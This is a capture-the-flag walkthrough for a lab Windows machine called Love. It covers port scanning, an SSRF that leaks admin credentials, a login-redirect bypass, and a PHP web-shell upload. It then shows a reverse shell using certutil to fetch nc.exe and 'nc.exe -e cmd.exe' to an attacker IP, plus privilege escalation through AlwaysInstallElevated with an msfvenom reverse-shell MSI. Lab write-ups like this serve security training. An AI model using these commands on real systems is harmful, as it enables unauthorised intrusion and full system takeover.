## Enumeration
---

### Nmap

As always, we will start by enumerating the ports on the target machine. To do this, we will use our beloved [nmap](https://github.com/nmap/nmap). The scan that we will be using scans all the port range, displays only the open ports and uses the TCP Syn Port Scan method. Additionally, DNS resolution and host discovery are disabled to speed up the scan. All evidence is stored in the `allPorts` file.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.239
```

# Nmap done at Mon Jul 26 23:54:23 2021 -- 1 IP address (1 host up) scanned in 16.19 seconds
```
{: file="enum/allPorts" }

Once we have the open ports, we will perform a more exhaustive exam. This scan will let us know what services and versions of them are running on the ports that we have just discovered are open. To do that, we will use the following command:

```bash
nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -oN targeted 10.10.10.239
```

{: file="enum/targeted" }

We can see that the number of ports that are open is huge. We will explore them in order so we don't get lost.

### Web Server

First, we will start enumerating the web server that is running on port 80. We open the browser and type in our target machine's IP address. We will see the following:

![Desktop View](enum1.png){: w="700" h="400" }
_Login Page_

We are in front of a login page. If we look at the URL, we can see that the login page is in the `index.php` file. This indicates that the web page is built in `PHP`, so we will keep this in mind.

After trying some default credentials (`admin:admin`, `user:password`, `administrator:password`) we can not authenticate against the server, so we will continue exploring.

To explorer further, we will fuzz the web server in order to find hidden directories. We will use [wfuzz](https://github.com/xmendez/wfuzz) and the `Dirbuster's` `directory-list-2.3-medium.txt` wordlist:

```bash
wfuzz -c --hc=404 -f fuzzRoot,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.239/FUZZ
```

{: file="enum/fuzzRoot" }

We can see that some interesting directories are found: `admin`, `images` and `plugins`. We will have this in mind and we will continue fuzzing the `admin` directory, as it seems the most intriguing one. We will this time fuzz for files with `PHP` extension inside of the `admin` folder:

```bash
wfuzz -c --hc=404 -f fuzzAdminPHP,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.239/admin/FUZZ.php

{: file="enum/fuzzAdminPHP" }

We can see a bunch of files. If we look at the status codes of the found pages, we can see that all of them have `302` status code, except the `index.php`, which has a `200` status code. If we try to navigate to any of the files with `302` status code, we will notice that we are being redirected to the `index.php` page.

### Intended path: Web server on port 443 and SSRF (Server-Side Request Forgery)

Remembering the enumeration phase of the target machine, we know that there is another web server running on port 443. The downside of this server is that we can't access it:

![Desktop View](enum9.png){: w="700" h="400" }
_Web Server in Port 443_

If we examine the website further, we can see the following in the certificate that is being used:

![Desktop View](enum10.png){: w="700" h="400" }
_HTTPS Certificate_

We can see that a domain is being leaked in the `SSL` certificate. This domain is `staging.love.htb` and we will add it to our `/etc/hosts`{: .filepath} file, as we guess the target machine could be using some sort of `Virtual Hosting` (host multiple domain names on a single machine). If we access this resource in our browser, we will see the following:

![Desktop View](enum6.png){: w="700" h="400" }
_staging.love.htb_

If we go to the `demo` tab:

![Desktop View](enum7.png){: w="700" h="400" }
_Demo tab_

We can see that this service asks for a `URL`, that later is analyzed to find `Malware` in it.

We are in front of a service that is asking us for a `URL`. We will try to point this `URL` to the internal resources of the machine, hoping we can find useful information. To do this, we will point it to the `127.0.0.1` IP address, which corresponds to `localhost` or, in other words, to the machine that is running the web server. If we achieve listing internal resources from the target machine, we will be facing an `SSRF (Server-Side Request Forgery)` vulnerability.

If we remember the enumeration phase, we had another web server running on port 5000. This web server, like the one on port 443, is unreachable. We will try to access it from the `staging.love.htb` `demo` tab:

![Desktop View](enum8.png){: w="700" h="400" }
_SSRF_

We can see that the following credentials for the `admin` user are being displayed:

```text
admin:@LoveIsInTheAir!!!!
```
{: file="credentials/webCreds" }

If we try these credentials on the login page of the web server on port 80, we can see that they are correct.

### Unintended path: Web server on port 80 (302 to 200)

In the fuzzing phase, the status code for most of the resources in the `admin` directory, was `302`. Having in mind some recently read Bug Bounty articles, we can try to bypass this `302` status code. First, we will open [Burpsuite](https://portswigger.net/burp/communitydownload) proxy to analyze further the responses and requests that are being exchanged between the web server and us.

The first resource that we will try to access is going to be `admin/home.php`, as it seems to be the principal page after being logged in. We will intercept this request with Burpsuite and we will indicate that we also want the response to be intercepted:

![Desktop View](enum2.png){: w="700" h="400" }
_Burpsuite Intercept_

We can see, how the response has a `302 Found` status code and also how the source code of the `home.php` page is being displayed:

![Desktop View](enum3.png){: w="700" h="400" }
_home.php Response_

We will try to change this `302 Found` to `200 OK` in the response and see what happens:

![Desktop View](enum4.png){: w="700" h="400" }
_home.php_

This works, and we can see how in the browser we are accessing the `home.php` page, meaning that we have bypassed the login page redirect.

To make this persistent and automatically change the `302 Found` status code to `200 OK`, we can use the following option from Burpsuite in `Proxy > Options > Match and Replace`:

![Desktop View](enum5.png){: w="700" h="400" }
_Burpsuite match and replace_

This will allow us to not have to change manually every response of resources that we can't access, thus making all the web pages display correctly, even though we don't have credentials to access them.

## User Shell

### Uploading malicious PHP file

Now that we have access to the web server's dashboard, we will go to the `voters` page. This page lets us add voters to the system. We will proceed to add a new voter.

This will take us to a web form that has the `Firstname`, `Lastname`, `Password` and `Photo` fields. We have an upload feature for the `Photo` field. We know that the server is running over `PHP` so we will focus on this upload feature. If we manage to sneak in `PHP` code in the image that we are uploading, and the image is not being sanitized, we have a chance that the server interprets the code and we gain `RCE (Remote Command Execution`.

First, we will do a test with a real image:

![Desktop View](user1.png){: w="700" h="400" }
_Real Image Upload Test_

We will intercept this request with `Burpsuite` to see how images are being uploaded to the server:

![Desktop View](user2.png){: w="700" h="400" }
_Burpsuite Intercept_

We can see how we have delimited fields in our request. We will center our attention on the one that contains the photo, as it will be the field where we are going to try to sneak our `PHP` payload.

In order to bypass any kind of filter the upload feature can have to identify fraudulent files, we will maintain the `Content-Type` as `image/jpeg`. Then, we will change the extension of the filename to `PHP` and the content of the image to `PHP` code that allows us to execute system-level commands on the victim machine via a GET HTTP parameter:

![Desktop View](user3.png){: w="700" h="400" }
_Burpsuite request_

If we remember the enumeration phase, we had an `image` directory on the web server. This directory can be the one where the user-uploaded images are being hosted, so we will proceed to examine it. We need to find if our `PHP` code is in this directory, as we need to access it in order to be interpreted by the web server.

We can see our `test.php` file in the directory, so we will access to it and use the `cmd` parameter in the URL to execute commands on the target machine:

![Desktop View](user4.png){: w="700" h="400" }
_whoami in Web Shell_

We can see that we have gained `RCE` as the `phoebe` user.

### Reverse Shell

Now we will try to convert this web shell into a reverse shell. In order to do this, we have to download the Windows [Netcat](http://netcat.sourceforge.net/) binary and host it on an HTTP server with `python3 -m http.server`.

From the web shell, we will transfer the binary to the target machine, in order to execute it and gain a reverse shell. To do this, we will use `certutil.exe`:

```text
http://10.10.10.239/Images/test.php?cmd=certutil.exe%20-f%20-split%20-urlcache%20http://10.10.15.1/nc.exe
```

_Netcat transfer_

Once we have the `Netcat` binary on the target machine, we will send a reverse shell to our machine. To do this, the first thing to do is to listen in a port of our machine, in this case in the `443`:

```bash
nc -nlvp 443
```

In the browser, using the binary that we have just transferred:

```text
http://10.10.10.239/images/test.php?cmd=nc.exe%20-e%20cmd.exe%2010.10.15.1%20443
```

_Reverse Shell whoami_

We will proceed to read the `user.txt` flag in the `C:\Users\phoebe\Desktop`{: .filepath} directory.

## System Shell

### Enumeration

At this point, we have to enumerate the target machine in order to escalate privileges. To do this, we will use [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).

First we will check the architecture and the version of Windows of the target machine using the `systeminfo` command:

![Desktop View](root1.png){: w="700" h="400" }
_Systeminfo_

We can see that we are dealing with a 64 bit architecture, so we will use the `winPEAS x64` binary.

Same to what we have done with the `Netcat` binary, we will transfer the `winPEAS` binary to our target machine. To do this, we will host the file with `python -m http.server`, and we will type the following command on the target machine:

```powershell
certutil.exe -f -split -urlcache http://10.10.15.1/winPEASx64.exe
```

Now, we will execute the `winPEAS` binary and export all the output to a file:

```powershell
winPEASx64.exe > winPeas.txt
```
{: .file="winPEASx64.exe"}

If we check the results of `winPEAS`, we can see the following:

_winPEAS output_

We can see how we are suggested to exploit the `AlwaysInstallElevated` privilege. This privilege allows any user to execute files with `.msi` extension (common Windows installers) as the `Administrator` user.

First, we will check if we really have this privilege on the target machine. In order to do this, we need to check some values in the Windows registry with the following commands:

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![Desktop View](root3.png){: w="700" h="400" }
_Registry values_

We can see how both of them have a value of `1`. This means that we can abuse this privilege.

### Malicious .msi file

To exploit this privilege, we can create a `.msi` malicious file with [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) that contains a TCP reverse shell. To do this:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.1 LPORT=9999 -f msi > 1.msi
```
{: file="1.msi"}

![Desktop View](root4.png){: w="700" h="400" }
_.msi File Creation_

Once we have the `.msi` file, we host it with `python3 -m http.server` command and we transfer it to the target machine with `certutil.exe`:

![Desktop View](root5.png){: w="700" h="400" }
_.msi File Transfer_

At the same time, we will start listening on the 9999 port using `Netcat`:

```bash
nc -nlvp 9999
```

Once the file is on the target machine and we are listening on the 9999 port, we will use the following command to execute the file that we have just transferred to the target machine:

```powershell
msiexec /quiet /qn /i 1.msi
```

If everything goes well, we will receive a TCP reverse shell as the `nt authority\system` user:

![Desktop View](root6.png){: w="700" h="400" }
_whoami system_

We will proceed to see the `root.txt` flag in the `C:\Users\Administrator\Desktop`{: .filepath} directory.
